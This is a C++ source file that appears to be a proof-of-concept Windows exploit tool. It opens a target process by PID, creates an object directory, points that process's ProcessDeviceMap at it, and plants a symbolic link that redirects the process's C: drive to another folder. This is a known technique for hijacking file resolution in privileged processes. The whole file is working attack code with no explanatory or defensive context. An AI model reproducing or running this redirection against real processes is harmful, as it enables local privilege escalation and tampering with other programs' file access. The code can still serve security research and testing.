#include <iostream>
#include <windows.h>
#include <winternl.h>

#define SYMBOLIC_LINK_ALL_ACCESS 0xF0001
#define DIRECTORY_ALL_ACCESS 0xF000F
#define ProcessDeviceMap 23

typedef NTSYSAPI NTSTATUS (*_NtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
typedef NTSYSAPI VOID (*_RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS (*_NtCreateSymbolicLinkObject)(PHANDLE pHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING DestinationName);
typedef NTSYSAPI NTSTATUS (*_NtCreateDirectoryObject)(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS (*_NtOpenDirectoryObject)(PHANDLE DirectoryObjectHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateDirectoryObject pNtCreateDirectoryObject;
_NtSetInformationProcess pNtSetInformationProcess;
_NtCreateSymbolicLinkObject pNtCreateSymbolicLinkObject;
_NtOpenDirectoryObject pNtOpenDirectoryObject;

void loadAPIs(void) {
	pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlInitUnicodeString");
	pNtCreateDirectoryObject = (_NtCreateDirectoryObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtCreateDirectoryObject");
	pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtSetInformationProcess");
	pNtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtCreateSymbolicLinkObject");
	pNtOpenDirectoryObject = (_NtOpenDirectoryObject)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtOpenDirectoryObject");

	if (pRtlInitUnicodeString == NULL ||
		pNtCreateDirectoryObject == NULL ||
		pNtSetInformationProcess == NULL ||
		pNtCreateSymbolicLinkObject == NULL ||
		pNtOpenDirectoryObject == NULL) {

		printf("[!] Could not load all API's\n");
		exit(1);
	}
}

BOOL directoryExists(const char* szPath) {
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

int main(int argc, char** argv)
{
	OBJECT_ATTRIBUTES objAttrDir;
	UNICODE_STRING objName;
	HANDLE dirHandle;
	HANDLE symlinkHandle;
	HANDLE targetProc;
	NTSTATUS status;
	OBJECT_ATTRIBUTES objAttrLink;
	UNICODE_STRING name;
	UNICODE_STRING target;
	DWORD pid;

	if (argc != 2) {
		printf("Usage: %s PID\n", argv[1]);
		return 2;
	}

	pid = atoi(argv[1]);

	loadAPIs();

	printf("[*] Opening process pid %d\n", pid);

	targetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (targetProc == INVALID_HANDLE_VALUE) {
		printf("[!] Error opening process handle\n");
		return 1;
	}

	printf("[*] Process opened, now creating object directory \\??\\wibble\n");

	pRtlInitUnicodeString(&objName, L"\\??\\wibble");
	InitializeObjectAttributes(&objAttrDir, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = pNtCreateDirectoryObject(&dirHandle, DIRECTORY_ALL_ACCESS, &objAttrDir);
	if (status != 0) {
		printf("[!] Error creating Object directory.\n");
		return 1;
	}

	printf("[*] Object directory created, now setting process ProcessDeviceMap to \\??\\wibble\n");

	status = pNtSetInformationProcess(targetProc, (PROCESS_INFORMATION_CLASS)ProcessDeviceMap, &dirHandle, sizeof(dirHandle));
	if (status != 0) {
		printf("[!] Error setting ProcessDeviceMap\n");
		return 2;
	}

	// NOTE: This is hardcoded to HardDiskVolume3... update to the volume on your system for this to work (or to something like '\Global??\C:')
	printf("[*] Done, finally linking C: to \\Device\\HardDiskVolume3\\test\n");

	if (!directoryExists("C:\\test")) {
		printf("[!] Error: Directory C:\\test does not exist for us to target\n");
		return 5;
	}

	pRtlInitUnicodeString(&name, L"C:");
	InitializeObjectAttributes(&objAttrLink, &name, OBJ_CASE_INSENSITIVE, dirHandle, NULL);

	pRtlInitUnicodeString(&target, L"\\Device\\HardDiskVolume3\\test");
	status = pNtCreateSymbolicLinkObject(&symlinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &objAttrLink, &target);
	if (status != 0) {
		printf("[!] Error creating symbolic link\n");
		return 3;
	}

	printf("[*] All Done, Hit Enter To Remove Symlink\n");
	getchar();

	CloseHandle(symlinkHandle);
	CloseHandle(dirHandle);

	printf("[*] Returning ProcessDeviceMap to \\??\n");

	pRtlInitUnicodeString(&objName, L"\\??");
	InitializeObjectAttributes(&objAttrDir, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = pNtOpenDirectoryObject(&dirHandle, DIRECTORY_ALL_ACCESS, &objAttrDir);
	if (status != 0) {
		printf("[!] Error creating Object directory.\n");
		return 1;
	}

	status = pNtSetInformationProcess(targetProc, (PROCESS_INFORMATION_CLASS)ProcessDeviceMap, &dirHandle, sizeof(dirHandle));
	if (status != 0) {
		printf("[!] Error setting ProcessDeviceMap\n");
		return 2;
	}

	return 0;

}